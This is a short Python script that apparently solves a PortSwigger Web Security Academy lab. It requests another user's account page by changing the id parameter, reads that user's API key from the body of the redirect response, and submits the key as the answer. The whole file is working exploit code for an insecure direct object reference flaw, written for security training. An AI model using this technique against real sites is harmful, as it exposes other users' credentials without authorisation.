################################################################################
#
# Author: Ahmed Elqalawy (@elqal3awii)
#
# Date: 5/9/2023
#
# Lab: User ID controlled by request parameter with data leakage in redirect
#
# Steps: 1. Fetch carlos profile
#        2. Extract the API key from response body before
#           redirecting to login page
#        3. Submit solution
#
###############################################################################


###########
# imports
###########
import requests
import re
from colorama import Fore


###########
# Main
###########

# change this to your lab URL
url = "https://0af900a904572533812b203c00ec00c7.web-security-academy.net"

try:  
    # fetch carlos profile
    carlos_profile = requests.post(f"{url}/my-account?id=carlos", allow_redirects=False)
    
except:
    print(Fore.RED + "[!] Failed to fetch carlos profile through exception")
    exit(1)

# if you logged in successfully
if carlos_profile.status_code == 302:
    print(Fore.WHITE + "1. Fetching carlos profile page.. " + Fore.GREEN + "OK")
    
    # extract the API key before redircting to login page
    api_key = re.findall("Your API Key is: (.*)</div>", carlos_profile.text)[0]
    
    print(Fore.WHITE + "2. Extracting the API key.. " + Fore.GREEN + "OK")
    
    # set answer  
    data = {
        "answer": api_key
    }
    
    try:
        # submit solution
        submit_solution = requests.post(f"{url}/submitSolution", data)

    except:
        print(Fore.RED + "[!] Failed to submit solution through exception")
        exit(1)

    print(Fore.WHITE + "3. Submitting solution.. " + Fore.GREEN + "OK")
    print(Fore.WHITE + "🗹 Check your browser, it should be marked now as " + Fore.GREEN + "solved")
    
else:
    print(Fore.RED + "[!] Failed to login as carlos")

